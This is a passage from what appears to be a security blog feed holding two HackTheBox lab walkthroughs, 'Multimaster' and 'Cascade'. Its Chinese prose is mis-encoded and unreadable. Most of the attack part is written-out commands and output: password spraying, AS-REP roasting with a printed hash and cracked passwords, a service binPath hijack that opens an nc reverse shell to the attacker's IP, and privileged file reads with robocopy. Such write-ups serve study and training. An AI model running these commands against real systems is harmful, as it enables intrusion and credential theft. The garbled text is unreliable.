alt="image-20240729104203181"></p><p>æ­¤æ—¶å‘ç°å·²ç»å°†æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°äº†</p><h2 id="é€†å‘åˆ†ædllæ–‡ä»¶è·å–å¯†ç "><a href="#é€†å‘åˆ†ædllæ–‡ä»¶è·å–å¯†ç " class="headerlink" title="é€†å‘åˆ†ædllæ–‡ä»¶è·å–å¯†ç "></a>é€†å‘åˆ†ædllæ–‡ä»¶è·å–å¯†ç </h2><p>åˆ†æä¸€ä¸‹æ˜¯ä»€ä¹ˆæ–‡ä»¶ </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729105646125-1589069605.png" alt="image-20240729105631937"></p><p>å‘ç°æ˜¯<code>.NET</code>æ–‡ä»¶ï¼Œç”¨<code>dnSpy</code>å·¥å…·åˆ†æ</p><p><a href="https://github.com/dnSpy/dnSpy/releases">dnSpy</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729110245688-624518175.png" alt="image-20240729110231243"></p><p>æœ€åå‘ç°å¯†ç <code>D3veL0pM3nT!</code></p><h2 id="ä¸‰æ¬¡å¯†ç å–·æ´’ç™»å½•sbauer"><a href="#ä¸‰æ¬¡å¯†ç å–·æ´’ç™»å½•sbauer" class="headerlink" title="ä¸‰æ¬¡å¯†ç å–·æ´’ç™»å½•sbauer"></a>ä¸‰æ¬¡å¯†ç å–·æ´’ç™»å½•sbauer</h2><p>ç†Ÿæ‚‰çš„å¯†ç ï¼Œç†Ÿæ‚‰çš„ç”¨æˆ·ååˆ—è¡¨ï¼Œå†æ¬¡è¿›è¡Œå¯†ç å–·æ´’ã€‚è¿™æ¬¡çš„ç”¨æˆ·ååˆ—è¡¨å’Œç¬¬ä¸€æ¬¡çš„ä¸€æ ·</p><p><code>crackmapexec smb 10.10.10.179 -u users -p D3veL0pM3nT!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729111508437-1929996575.png" alt="image-20240729111442645"></p><p>å†éªŒè¯ä¸€ä¸‹å¯ä¸å¯ä»¥ç™»å½•</p><p><code>crackmapexec winrm 10.10.10.179 -u sbauer -p &#39;D3veL0pM3nT!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729112326611-1209904571.png" alt="image-20240729112311645"></p><p>å¯ä»¥è¿œç¨‹ç™»å½•ï¼Œç›´æ¥ç™»å½•</p><p><code>evil-winrm -i 10.10.10.179 -u sbauer -p &#39;D3veL0pM3nT!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729112737022-1061168092.png" alt="image-20240729112710433"></p><p>ç™»å½•æˆåŠŸï¼Œä½†æ˜¯å‘ç°æ²¡ä»€ä¹ˆå¯ä»¥ç›´æ¥åˆ©ç”¨èƒ½å¤Ÿææƒçš„æƒé™</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729135847596-1147621995.png" alt="image-20240729135821896"></p><h2 id="bloodhoundäºŒæ¬¡ä¿¡æ¯æœé›†"><a href="#bloodhoundäºŒæ¬¡ä¿¡æ¯æœé›†" class="headerlink" title="bloodhoundäºŒæ¬¡ä¿¡æ¯æœé›†"></a>bloodhoundäºŒæ¬¡ä¿¡æ¯æœé›†</h2><p>ç°åœ¨æˆ‘ä»¬å·²ç»æ‹¿ä¸‹äº†ä¸‰ä¸ªç”¨æˆ·ï¼Œåˆ†åˆ«æ˜¯<code>tushikikatomo</code>ã€<code>cyork</code>ã€<code>sbauer</code></p><p>åœ¨<code>bloodhound</code>ä¸­å°†ä»–ä»¬æ ‡è®°ä¸ºå·²ç»æ‹¿ä¸‹çš„ç”¨æˆ·ï¼Œç„¶åç‚¹å‡»<code>Shortest Paths to High Value Targets</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729114754648-851746975.png" alt="image-20240729114739900"></p><p>çœ‹ç€å°±å¥½å¤æ‚ï¼Œä½†æ˜¯ä»”ç»†çœ‹ä¼šå‘ç°å¾ˆå¤šé‡è¦çš„ä¿¡æ¯</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729114950277-1415659020.png" alt="image-20240729114935752"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730173507194-1884458758.png" alt="image-20240730173454585"></p><p>ä»”ç»†çœ‹ä¼šå‘ç°<code>sbauer</code>ç”¨æˆ·å’Œ<code>jorden</code>ç”¨æˆ·æœ‰<code>GenericWrite</code>å…³ç³»ï¼Œå¹¶ä¸”<code>jorden</code>ç”¨æˆ·å±äº<code>SERVER_OPERATORS</code>ç»„ï¼ˆé«˜æƒé™ç»„ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥è¯•è¯•èƒ½å¦é€šè¿‡æ»¥ç”¨<code>GenericWrite</code>æƒé™å®ç°æ¨ªå‘ç§»åŠ¨</p><h2 id="æ»¥ç”¨GenericWriteæƒé™æ¨ªç§»ç™»å½•jorden"><a href="#æ»¥ç”¨GenericWriteæƒé™æ¨ªç§»ç™»å½•jorden" class="headerlink" title="æ»¥ç”¨GenericWriteæƒé™æ¨ªç§»ç™»å½•jorden"></a>æ»¥ç”¨GenericWriteæƒé™æ¨ªç§»ç™»å½•jorden</h2><blockquote><p>å…ˆçœ‹çœ‹ä¹‹å‰æåˆ°çš„ AS-REP roastingæ”»å‡»ï¼Œè¯¥æ”»å‡»å…è®¸ä¸ºé€‰æ‹©äº†â€œä¸éœ€è¦ Kerberos é¢„èº«ä»½éªŒè¯â€å±æ€§çš„ç”¨æˆ·ç ´è§£å¯†ç å“ˆå¸Œçš„æŠ€æœ¯ã€‚äº‹å®ä¸Šï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰å¯ç”¨ Kerberos é¢„èº«ä»½éªŒè¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºè¯¥ç”¨æˆ·è¯·æ±‚ AS-REPï¼Œå¹¶ä¸”å¯ä»¥ç¦»çº¿ç ´è§£ä»è€Œå°è¯•æ¢å¤å…¶æ˜æ–‡å¯†ç ã€‚è€Œè¿™é‡ŒSBAUERç”¨æˆ·å¯¹JORDENç”¨æˆ·å…·æœ‰é€šç”¨å†™æƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¸ºJORDENç”¨æˆ·è®¾ç½®â€œä¸éœ€è¦ Kerberos é¢„èº«ä»½éªŒè¯â€çš„å±æ€§ï¼Œä»è€Œå°è¯•ä½¿ç”¨AS-REP roastingæ”»å‡»è·å–å…¶æ˜æ–‡å¯†ç ã€‚</p></blockquote><p>å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™æ¡å‘½ä»¤æ¥ä¸º<code>jorden</code>ç”¨æˆ·è®¾ç½®â€œä¸éœ€è¦ <code>Kerberos</code> é¢„èº«ä»½éªŒè¯â€çš„å±æ€§</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> jorden | <span class="built_in">Set-ADAccountControl</span> <span class="literal">-doesnotrequirepreauth</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730173952758-9402141.png" alt="image-20240730173951299"></p><p>ä½¿ç”¨<code>impactet</code>ä¸‹çš„<code>GetNPUsers</code>è„šæœ¬æ¥è·å–<code>jorden</code>ç”¨æˆ·çš„<code>AS-REP</code>ç¥¨æ®</p><p><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/jorden -dc-ip 10.10.10.179</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730174416438-495478340.png" alt="image-20240730174414913"></p><p>è¿™æ ·å°±è·å–åˆ°äº†<code>AS-REP</code>ç¥¨æ®ï¼Œå°†ä¸Šè¿°ç¥¨æ®ä¿å­˜è‡³æ–‡ä»¶<code>hash</code>ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$jorden@MEGACORP.LOCAL:6127c87770a9aed57005d987e2818bd2$b6a67b254f3670033f7f32d0da0a98deae8f8dbbbd71917d7e27b9ef57ff4a394af9046f1a7673137568f7572276cfaad5af44c4def95bdadeaca1dbbe31fce3c9414823286c8a8a350b7bddce823eb93d4289a49d1e8dae1654ee01cc64d744a088c9723bc5183c0a8d0128b9b394973cbdf7051400953c5e9c6250c191c020ad1bb13615a6a60f02539b169280384e47f5049f8ccc8f9c882918c7d740044118ef07d521344784d8717fb6f6223bdffd341d7334e50e184dfb3c390913381725c7bec1a212fa0a148287bebe6cac9c114974b08bc658c3acfc61ad18ade1bc1d9419790395ef5b16edc5e2145e11d0</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>john</code>å°è¯•ç ´è§£è·å–æ˜æ–‡å¯†ç </p><p><code>john hash -w=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -w=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730174813435-1439858535.png" alt="image-20240730174800662"></p><p>å¾—åˆ°<code>jorden</code>ç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼š<code>rainforest786</code></p><p>åˆ©ç”¨<code>crackmapexec</code>éªŒè¯æ˜¯å¦èƒ½å¤Ÿè¿œç¨‹ç™»å½•</p><p><code>crackmapexec winrm 10.10.10.179 -u jorden -p &#39;rainforest786&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730175140880-587706820.png" alt="image-20240730175138971"></p><p>å¯ä»¥ç™»å½•ï¼Œç›´æ¥åˆ©ç”¨<code>evil-winrm</code>ç™»å½•</p><p><code>evil-winrm -i 10.10.10.179 -u jorden -p &#39;rainforest786&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730175305311-1791317928.png" alt="image-20240730175303829"></p><p>ç™»é™†æˆåŠŸ</p><h1 id="ADåŸŸææƒ"><a href="#ADåŸŸææƒ" class="headerlink" title="ADåŸŸææƒ"></a>ADåŸŸææƒ</h1><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>å…ˆçœ‹ä¸€ä¸‹è¯¥ç”¨æˆ·æ‰€æ‹¥æœ‰çš„æƒé™</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730180856080-662594263.png" alt="image-20240730180854225"></p><p>ä¹‹å‰åœ¨<code>bloodhound</code>ä¸­æåˆ°è¿‡è¯¥ç”¨æˆ·å±äº<code>SERVER_OPERATORS</code>ç»„ï¼ˆé«˜æƒé™ç»„ï¼‰</p><blockquote><p>Server Operatorsç»„ï¼šè¯¥ç»„ä»…å­˜åœ¨äºåŸŸæ§åˆ¶å™¨ä¸Šçš„å†…ç½®ç»„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥ç»„æ²¡æœ‰æˆå‘˜ã€‚æœåŠ¡å™¨æ“ä½œå‘˜å¯ä»¥äº¤äº’å¼ç™»å½•åˆ°æœåŠ¡å™¨ï¼›åˆ›å»ºå’Œåˆ é™¤ç½‘ç»œå…±äº«ï¼›å¯åŠ¨å’Œåœæ­¢æœåŠ¡ï¼›å¤‡ä»½å’Œæ¢å¤æ–‡ä»¶ï¼›æ ¼å¼åŒ–ç”µè„‘ç¡¬ç›˜ï¼›å¹¶å…³é—­è®¡ç®—æœºã€‚</p></blockquote><p>æ‰€ä»¥å¯ä»¥å°è¯•åˆ©ç”¨ä¸€ä¸‹è¯¥ç»„æƒé™</p><h2 id="æ»¥ç”¨Server-Operatorsç»„æƒé™å®ç°æƒé™æå‡"><a href="#æ»¥ç”¨Server-Operatorsç»„æƒé™å®ç°æƒé™æå‡" class="headerlink" title="æ»¥ç”¨Server Operatorsç»„æƒé™å®ç°æƒé™æå‡"></a>æ»¥ç”¨Server Operatorsç»„æƒé™å®ç°æƒé™æå‡</h2><ul><li>åˆ©ç”¨æ€è·¯</li></ul><blockquote><p>å¯ä»¥æ‰¾ç³»ç»ŸæœåŠ¡ï¼Œå°†å…¶æ‰§è¡Œæ”¹å†™ï¼Œæ¯”å¦‚æˆ‘è®©ä»–å»æ‰§è¡Œncä¸ºæˆ‘æœºå™¨å»ºç«‹ä¸€ä¸ªåå‘è¿æ¥çš„shellï¼Œç„¶åå°†æœåŠ¡é‡å¯ï¼Œé‚£ä¹ˆç³»ç»Ÿä¾¿ä¼šåŠ è½½è¯¥æœåŠ¡å¹¶å»ºç«‹ä¸€ä¸ªåå‘è¿æ¥çš„shellç»™æˆ‘çš„æœºå™¨ï¼Œè¯¥shellåº”è¯¥æ˜¯ç³»ç»Ÿçº§åˆ«çš„ã€‚</p></blockquote><p>é¦–å…ˆé€šè¿‡<code>upload</code>å°†``nc64.exeä¼ ä¸Šå»</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730181748748-1462306931.png" alt="image-20240730181747343"></p><p>ç»è¿‡å¤šæ¬¡æµ‹è¯•åå‘ç°å¯ä»¥æ”¹å˜<code>browser</code>æœåŠ¡çš„è·¯å¾„</p><p><code>sc.exe config browser binPath= &quot;C:\Users\jorden\Documents\nc64.exe -e cmd.exe 10.10.14.3 80&quot;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730183323514-296023642.png" alt="image-20240730183321829"></p><p>å…ˆåœ¨<code>kali</code>ä¸­è®¾ç½®ç›‘å¬</p><p><code>nc -lvp 80</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730183429220-759850834.png" alt="image-20240730183427653"></p><p>ç„¶ååœ¨é¶æœºä¸­æ‰‹åŠ¨é‡å¯<code>browser</code>æœåŠ¡</p><p><code>sc.exe stop browser</code></p><p><code>sc.exe start browser</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730183808518-2033487681.png" alt="image-20240730183806758"></p><p>æ­¤æ—¶<code>kali</code>ä¸­æ”¶åˆ°å›æ˜¾</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730184223527-981482744.png" alt="image-20240730184218688"></p><p>å‘ç°å·²ç»æ˜¯<code>system</code>æƒé™</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730193239799-1215521076.png" alt="image-20240730193237991"></p><p>æœ€ååœ¨<code>C:\Users\Administrator\Desktop</code>ç›®å½•ä¸‹æ‰¾åˆ°<code>root.txt</code></p><h1 id="å…¶ä»–ææƒæ–¹æ³•"><a href="#å…¶ä»–ææƒæ–¹æ³•" class="headerlink" title="å…¶ä»–ææƒæ–¹æ³•"></a>å…¶ä»–ææƒæ–¹æ³•</h1><h2 id="SeBackupPrivilegeå’ŒSeRestorePrivilegeæƒé™çš„æ»¥ç”¨"><a href="#SeBackupPrivilegeå’ŒSeRestorePrivilegeæƒé™çš„æ»¥ç”¨" class="headerlink" title="SeBackupPrivilegeå’ŒSeRestorePrivilegeæƒé™çš„æ»¥ç”¨"></a>SeBackupPrivilegeå’ŒSeRestorePrivilegeæƒé™çš„æ»¥ç”¨</h2><p>åœ¨å¯¹<code>jorden</code>ç”¨æˆ·ä¿¡æ¯æœé›†çš„æ—¶å€™ï¼Œå‘ç°å¦‚ä¸‹å†…å®¹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730193338002-1111181364.png" alt="image-20240730193320821"></p><p>å‘ç°è¯¥ç”¨æˆ·å…·æœ‰<code>SeBackupPrivilege</code>å’Œ<code>SeRestorePrivilege</code>æƒé™</p><p>æœ‰äº†<code>SeBackupPrivilege</code>å’Œ<code>SeRestorePrivilege</code>è¿™ä¸¤ä¸ªæƒé™ï¼Œå°±å¯ä»¥ç”¨<code>robocopy</code>æ¥è¯»å–æ–‡ä»¶</p><p><code>robocopy /b C:\users\administrator\desktop C:\Users\jorden\Documents</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730193636356-418270461.png" alt="image-20240730193634029"></p>]]></content>
    
    
    <summary type="html">HackTheBoxç¯‡åŸŸæ¸—é€ç³»åˆ—ä¹‹Multimaster</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="åŸŸæ¸—é€" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Cascade</title>
    <link href="https://www.fomal.cc/posts/7112d8f8.html"/>
    <id>https://www.fomal.cc/posts/7112d8f8.html</id>
    <published>2024-07-22T03:04:22.000Z</published>
    <updated>2024-10-06T08:25:24.870Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>é¶æœºipï¼š10.10.10.182</p><p>æ”»å‡»æœºipï¼š10.10.14.16</p></blockquote><h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul><li>TightVNCå¯†ç ç ´è§£</li><li>AD Recycle Binæ»¥ç”¨æƒé™æå‡</li></ul><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p><code>nmap -sS -sV -sC -p- 10.10.10.182</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 11:27 CST</span><br><span class="line">Nmap scan report for 10.10.10.182</span><br><span class="line">Host is up (0.45s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">53/tcp    open     domain         Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)</span><br><span class="line">88/tcp    open     kerberos-sec   Microsoft Windows Kerberos (server time: 2024-07-22 03:28:03Z)</span><br><span class="line">135/tcp   open     msrpc          Microsoft Windows RPC</span><br><span class="line">389/tcp   open     ldap           Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open     microsoft-ds?</span><br><span class="line">464/tcp   filtered kpasswd5</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">636/tcp   open     tcpwrapped</span><br><span class="line">1337/tcp  filtered waste</span><br><span class="line">1433/tcp  filtered ms-sql-s</span><br><span class="line">3268/tcp  open     ldap           Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open     tcpwrapped</span><br><span class="line">5722/tcp  filtered msdfsr</span><br><span class="line">5985/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">8080/tcp  filtered http-proxy</span><br><span class="line">9389/tcp  filtered adws</span><br><span class="line">47001/tcp filtered winrm</span><br><span class="line">49152/tcp filtered unknown</span><br><span class="line">49153/tcp filtered unknown</span><br><span class="line">49154/tcp open     msrpc          Microsoft Windows RPC</span><br><span class="line">49155/tcp open     msrpc          Microsoft Windows RPC</span><br><span class="line">49157/tcp open     ncacn_http     Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open     msrpc          Microsoft Windows RPC</span><br><span class="line">49167/tcp filtered unknown</span><br><span class="line">49172/tcp filtered unknown</span><br><span class="line">49173/tcp filtered unknown</span><br><span class="line">50255/tcp filtered unknown</span><br><span class="line">Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -1s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2:1:0:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-07-22T03:28:58</span><br><span class="line">|_  start_date: 2024-07-22T03:07:52</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 130.17 seconds</span><br></pre></td></tr></table></figure><p>ä»ä¸Šè¿°ç»“æœä¸­å¯ä»¥å‘ç°ï¼Œä¸»æœºä¸º<code>windows_server_2008</code>ï¼ŒåŸŸåæ˜¯<code>cascade.local</code>ï¼Œå¼€å¯çš„æœåŠ¡æœ‰<code>DNS</code>æœåŠ¡ã€<code>Kerberos</code>æœåŠ¡ã€<code>rpc</code>æœåŠ¡ã€<code>ldap</code>æœåŠ¡ã€<code>SMB</code>æœåŠ¡ã€åœ¨<code>1433</code>ç«¯å£ä¸Šè¿è¡Œç€<code>SQL Server</code>ã€åœ¨<code>8080</code>ç«¯å£ä¹Ÿæœ‰æœåŠ¡ï¼Œä½†æ˜¯å¤§å¤šæ•°æœåŠ¡éƒ½è¢«é˜²ç«å¢™è¿‡æ»¤äº†</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>ç›´æ¥æµ‹è¯•smbèƒ½ä¸èƒ½åŒ¿åç™»å½•</p><p><code>smbclient -N -L //10.10.10.182</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722141009245-1281612221.png" alt="image-20240722140947016"></p><p>èƒ½æˆåŠŸç™»å½•ä½†æ˜¯è·å¾—ä¸äº†ä»€ä¹ˆé‡è¦çš„ä¿¡æ¯</p><h2 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h2><p><code>rpc</code>çœ‹çœ‹èƒ½ä¸èƒ½è·å–ä¸€äº›ä¿¡æ¯</p><p><code>rpcclient -U &quot;&quot; -N 10.10.10.182</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722141314680-1424103600.png" alt="image-20240722141252468"></p><p>å‘ç°èƒ½è·å¾—ä¸€äº›ç”¨æˆ·å</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CascGuest</span><br><span class="line">arksvc</span><br><span class="line">s.smith</span><br><span class="line">r.thompson</span><br><span class="line">util</span><br><span class="line">j.wakefield</span><br><span class="line">s.hickson</span><br><span class="line">j.goodhand</span><br><span class="line">a.turnbull</span><br><span class="line">e.crowe</span><br><span class="line">b.hanson</span><br><span class="line">d.burman</span><br><span class="line">BackupSvc</span><br><span class="line">j.allen</span><br><span class="line">i.croft</span><br></pre></td></tr></table></figure><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><p>ç”¨<code>ldapsearch</code>æµ‹è¯•ä¸€ä¸‹</p><p><code>ldapsearch -x -b &quot;dc=cascade,dc=local&quot; -H ldap://10.10.10.182</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722150135151-525710537.png" alt="image-20240722150112607"></p><p>æ‰¾åˆ°<code>Ryan Thompson</code>åœ¨<code>Cascade</code>ä¸Šçš„ç”¨æˆ·åæ˜¯<code>r.thompson</code>ï¼Œè¿™ä¸ªåå­—ä¹‹å‰<code>rpc</code>æšä¸¾å‡ºæ¥è¿‡ï¼ŒåŒæ—¶å‘ç°åœ¨<code>`Ryan Thompsonç”¨æˆ·çš„æœ€åä¸€ä¸ªæ•°æ®é¡¹ä¸­æœ‰</code>cascadeLegacyPwd<code>æ•°æ®ï¼Œå°†å…¶å€¼</code>clk0bjVldmE=`è¿›è¡Œè§£ç </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722145836886-812006840.png" alt="image-20240722145814808"></p><p>å¾—åˆ°è§£å¯†åçš„æ•°æ®<code>rY4n5eva</code>ï¼Œç–‘ä¼¼<code>r.thompson</code>çš„å¯†ç </p><p>æäº¤åå‘ç°è¿™çœŸæ˜¯<code>Ryan Thompson</code>çš„å¯†ç </p><p>æµ‹è¯•èƒ½ä¸èƒ½è¿æ¥</p><p><code>crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722150712665-1667520013.png" alt="image-20240722150650469"></p><h2 id="r-thompson-SMB"><a href="#r-thompson-SMB" class="headerlink" title="r.thompson-SMB"></a>r.thompson-SMB</h2><p>å‘ç°å¯ä»¥è¿›è¡Œ<code>smb</code>è¿æ¥ï¼Œç”¨<code>smbmap</code>è¿æ¥ä¸€ä¸‹</p><p><code>smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722153218137-609195675.png" alt="image-20240722153155560"></p><p>é€šè¿‡ <code>smbmap</code> å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åªå¯¹ <code>Data</code> ç›®å½•å…·æœ‰å¯è¯»æƒé™ï¼Œå°è¯•è¿æ¥</p><p><code>smbclient \\\\10.10.10.182\\Data -U r.thompson</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722153846790-786836942.png" alt="image-20240722153817069"></p><p>æµ‹è¯•åå‘ç°åªå¯¹<code>IT</code>ç›®å½•æœ‰è®¿é—®æƒé™ï¼Œå°†æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°è¿›è¡Œè§‚å¯Ÿ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; mask <span class="string">&quot;&quot;</span></span><br><span class="line">smb: \&gt; recurse ON <span class="comment">#é»˜è®¤æƒ…å†µä¸‹é€’å½’é€‰é¡¹æ˜¯OFF,åœ¨ smb æç¤ºç¬¦ä¸‹è¾“å…¥ recurse ONå‘½ä»¤ä¼šå°†æ­¤é€‰é¡¹åˆ‡æ¢ä¸ºON</span></span><br><span class="line">smb: \&gt; prompt OFF <span class="comment">#é»˜è®¤æƒ…å†µä¸‹è¯¢é—®æ˜¯å¦ä¸‹è½½é€‰é¡¹æ˜¯ON,åœ¨ smb æç¤ºç¬¦ä¸‹è¾“å…¥prompt OFFå‘½ä»¤ä¼šå°†æ­¤é€‰é¡¹åˆ‡æ¢ä¸ºOFF</span></span><br><span class="line">smb: \&gt; mget *<span class="comment">#æ­¤æ—¶å¯ä»¥åœ¨ä¸è¯¢é—®çš„æƒ…å†µä¸‹é€’å½’ä¸‹è½½dataç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722162504399-800993694.png" alt="image-20240722162438200"></p><h1 id="å…±äº«æ–‡ä»¶å¤¹Dataåˆ†æ"><a href="#å…±äº«æ–‡ä»¶å¤¹Dataåˆ†æ" class="headerlink" title="å…±äº«æ–‡ä»¶å¤¹Dataåˆ†æ"></a>å…±äº«æ–‡ä»¶å¤¹Dataåˆ†æ</h1><h2 id="ç ´è§£TightVNCå¯†ç "><a href="#ç ´è§£TightVNCå¯†ç " class="headerlink" title="ç ´è§£TightVNCå¯†ç "></a>ç ´è§£TightVNCå¯†ç </h2><p>åœ¨æŸ¥æ‰¾æ–‡ä»¶æ—¶ï¼Œå‘ç°åœ¨<code>IT/Temp/s.smith</code>ç›®å½•çš„<code>Install.reg</code>æ–‡ä»¶ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªvncå¯†ç </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722164045214-1255540472.png" 